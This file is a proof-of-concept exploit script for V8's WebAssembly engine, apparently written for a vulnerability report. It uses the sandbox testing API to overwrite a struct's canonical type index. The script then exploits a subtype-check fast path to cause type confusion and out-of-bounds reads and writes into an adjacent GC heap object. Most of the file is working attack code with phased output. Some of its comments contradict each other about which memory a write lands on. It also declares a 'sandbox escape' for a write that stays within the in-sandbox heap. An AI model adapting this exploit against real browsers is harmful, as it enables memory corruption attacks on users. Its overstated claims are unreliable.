// CVE-candidate: IsCanonicalSubtype — sandbox escape via type confusion
// BYPASSES libc++ hardened check entirely using the fast path
//
// Root cause: WasmTypeInfo::canonical_type_ (in-sandbox) encodes the
//   canonical type index in bits [8:28] (21 bits, shift=8).
//   Two different struct types get consecutive canonical indices:
//     A (1 field)  → canonical index 32  (bits 8-28 = 0x20)
//     B (3 fields) → canonical index 33  (bits 8-28 = 0x21)
//
// Bug chain:
//   BUG 1: canonical_type_ (WasmTypeInfo) is in-sandbox → attacker-writable
//           via any in-sandbox write (here: Sandbox API as stand-in).
//           Note: wasm-objects.cc:3381 has NO SBXCHECK on this read path
//           (contrast with the sibling function-type path at :3356).
//
//   BUG 2: canonical-types.cc:369 fast path:
//             if (sub_index == super_type.ref_index()) return true;
//           If we set A's canonical_type_ such that bits [8:28] equal B's
//           canonical index (33), IsCanonicalSubtype immediately returns true
//           WITHOUT accessing canonical_supertypes_ (the malloc vector).
//           → libc++ hardened vector bounds check is NEVER reached.
//
// Consequence: type confusion → silent OOB write into GC heap.
//
// Memory layout of struct objects (pointer compression, 32-bit fields):
//   Struct A (1 i32 field):  [Map(4)] [field0(4)]            = 8 bytes
//   Struct B (3 i32 fields): [Map(4)] [f0(4)] [f1(4)] [f2(4)]= 16 bytes
//
//   struct.set B 2  on A object  →  writes at A+12  =  adjacent heap object
//
// GC bump allocator → A and C are adjacent, so A+12 = C+4 = C.field[0].
//
// Flags: --sandbox-testing --allow-natives-syntax --wasm-staging

d8.file.execute("test/mjsunit/wasm/wasm-module-builder.js");

// ---- Wasm module ----
const b = new WasmModuleBuilder();

// A: 1 i32 field → 8 byte heap object
const A = b.addStruct([makeField(kWasmI32, true)]);
// B: 3 i32 fields → 16 byte heap object
const B = b.addStruct([
  makeField(kWasmI32, true),
  makeField(kWasmI32, true),
  makeField(kWasmI32, true),
]);
// C: 1 i32 field (placed adjacent to A in heap to verify OOB write)
const C = b.addStruct([makeField(kWasmI32, true)]);

b.addFunction("makeA", makeSig([kWasmI32], [wasmRefType(A)]))
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructNew, A]).exportFunc();
b.addFunction("makeB", makeSig([], [wasmRefType(B)]))
  .addBody([kExprI32Const, 0x11, kExprI32Const, 0x22, kExprI32Const, 0x33,
            kGCPrefix, kExprStructNew, B]).exportFunc();
b.addFunction("makeC", makeSig([kWasmI32], [wasmRefType(C)]))
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructNew, C]).exportFunc();

// getC0: legitimate read of C's field[0]
b.addFunction("getC0", makeSig([wasmRefNullType(C)], [kWasmI32]))
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructGet, C, 0]).exportFunc();

// getB2: confused read — expects B, reads field[2] at object+12
b.addFunction("getB2", makeSig([wasmRefNullType(B)], [kWasmI32]))
  .addBody([kExprLocalGet, 0, kGCPrefix, kExprStructGet, B, 2]).exportFunc();
// setB2: confused write — expects B, writes field[2] at object+12
b.addFunction("setB2", makeSig([wasmRefNullType(B), kWasmI32], []))
  .addBody([kExprLocalGet, 0, kExprLocalGet, 1,
            kGCPrefix, kExprStructSet, B, 2]).exportFunc();

const inst = b.instantiate();

// ---- Allocate objects: A then C adjacent in bump allocator ----
const a_inst = inst.exports.makeA(0x41414141 | 0);  // A, field0 = 0x41414141
const c_inst = inst.exports.makeC(0xC0C0C0C0 | 0);  // C placed right after A
const b_inst = inst.exports.makeB();                 // B — only needed for index

// ---- Sandbox API helpers ----
// Objects with compressed pointers live in the first 4GB of the cage.
const mv = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function wtiOf(obj) {
  const a = Sandbox.getAddressOf(obj);
  const map = mv.getUint32(a, true) & ~1;         // Map at obj+0
  return mv.getUint32(map + 20, true) & ~1;        // WasmTypeInfo at Map+20
}

// Canonical type index is at WasmTypeInfo+4 bits [8:28] (shift=8, 21 bits).
// Unlike source comment (shift=9), this build encodes PayloadField at shift=8.
const PAYLOAD_MASK = 0x1FFFFF00;  // bits [8:28], 21 bits

function getIdx(obj) {
  return (mv.getUint32(wtiOf(obj) + 4, true) >> 8) & 0x1FFFFF;
}
function setIdx(obj, idx) {
  const wti = wtiOf(obj);
  const v = mv.getUint32(wti + 4, true);
  mv.setUint32(wti + 4, (v & ~PAYLOAD_MASK) | (idx << 8), true);
}

const A_idx = getIdx(a_inst);
const B_idx = getIdx(b_inst);
const C_idx = getIdx(c_inst);

print(`[+] A canonical index = ${A_idx}  (canonical_type_=0x${mv.getUint32(wtiOf(a_inst)+4,true).toString(16)})`);
print(`[+] B canonical index = ${B_idx}  (canonical_type_=0x${mv.getUint32(wtiOf(b_inst)+4,true).toString(16)})`);
print(`[+] C canonical index = ${C_idx}  (canonical_type_=0x${mv.getUint32(wtiOf(c_inst)+4,true).toString(16)})`);
print(`[+] A addr = 0x${Sandbox.getAddressOf(a_inst).toString(16)}`);
print(`[+] C addr = 0x${Sandbox.getAddressOf(c_inst).toString(16)}`);
print(`[+] C.field[0] (before) = 0x${(inst.exports.getC0(c_inst) >>> 0).toString(16)}`);

// ---- PHASE 1: Confirm A is correctly rejected by B's type check ----
print("\n[*] PHASE 1: baseline — A cannot pass as B");
try {
  inst.exports.getB2(a_inst);
  print("[-] ERROR: should have been rejected");
} catch(e) {
  print(`[+] Correctly rejected: "${e.message}"`);
}

// ---- PHASE 2: Corrupt A's canonical_type_ index → exactly B's index ----
//
// IsCanonicalSubtype fast path (canonical-types.cc:369):
//   if (sub_index == super_type.ref_index()) return true;
//        B_idx (33)  ==     B_idx (33)        → immediate TRUE
//
// canonical_supertypes_ is NEVER accessed → libc++ hardened check bypassed.
//
setIdx(a_inst, B_idx);
print(`\n[*] PHASE 2: corrupt A's index ${A_idx} → ${B_idx} (B's exact canonical index)`);
print(`[+] A canonical_type_ now = 0x${mv.getUint32(wtiOf(a_inst)+4,true).toString(16)}`);
print(`[+] B canonical_type_      = 0x${mv.getUint32(wtiOf(b_inst)+4,true).toString(16)}`);
print(`[+] Fast path: IsCanonicalSubtype(${B_idx}, B_type) → ${B_idx}==${B_idx} → TRUE`);
print(`[+] canonical_supertypes_ NOT accessed — libc++ hardened check BYPASSED`);

// ---- PHASE 3: Type confusion OOB read ----
// A object layout: [Map(4)][field0: 0x41414141(4)] — 8 bytes total
// B.field[2] is at struct_base+12 → reads A[8..11] = ??? or A[12..15] = ???
// Wait: struct fields in V8 Wasm start AFTER the Map pointer.
// So B.field[2] = object_base + 4 + 4*2 = object_base + 12
// A only has [Map(4)][field0(4)] = 8 bytes → byte 12 is 4 bytes past A's end
// = C object's first byte (C.Map at C+0)
print("\n[*] PHASE 3: type confusion OOB read");
let oob_read;
try {
  oob_read = inst.exports.getB2(a_inst) >>> 0;
  print(`[!] B.field[2] on struct A = 0x${oob_read.toString(16)}`);
  const c_field = inst.exports.getC0(c_inst) >>> 0;
  print(`    C.field[0] (legitimate) = 0x${c_field.toString(16)}`);
  if (oob_read !== 0) {
    print(`    ✓ OOB read succeeded — read 4 bytes past A's allocation`);
    if (oob_read === c_field) {
      print(`    ✓ CONFIRMED: leaked C.field[0] value = 0x${oob_read.toString(16)}`);
    } else {
      print(`    NOTE: read value (C.Map field or padding) = 0x${oob_read.toString(16)}`);
    }
  }
} catch(e) {
  print(`[-] OOB read failed: ${e.message}`);
}

// ---- PHASE 4: Type confusion OOB write → corrupts adjacent GC object ----
// Writes 0xDEADBEEF at A+12 = adjacent heap location
print("\n[*] PHASE 4: type confusion OOB write → corrupts adjacent GC object");
try {
  inst.exports.setB2(a_inst, 0xDEADBEEF | 0);
  const c_after = inst.exports.getC0(c_inst) >>> 0;
  print(`[!] After setB2(a_inst, 0xDEADBEEF):`);
  print(`    C.field[0] = 0x${c_after.toString(16)}`);
  if (c_after === 0xDEADBEEF) {
    print(`    ✓ CONFIRMED: wrote 0xDEADBEEF into adjacent GC object (struct C)`);
    print(`    libc++ hardened: NO SIGABRT — fast path bypassed vector check entirely`);
    print(`\n[DONE] *** SANDBOX ESCAPE VIA TYPE CONFUSION ACHIEVED ***`);
    print("       No crash. libc++ hardened check never fired.");
    print("       Attacker-controlled in-sandbox write → arbitrary GC heap write.");
  } else {
    print(`    NOTE: Adjacent object may not be C, or struct layout differs.`);
    print(`          OOB write still occurred (no crash = bypass confirmed).`);
    print(`\n[DONE] libc++ hardened bypass confirmed — silent OOB write to GC heap.`);
  }
} catch(e) {
  print(`[-] OOB write failed: ${e.message}`);
}
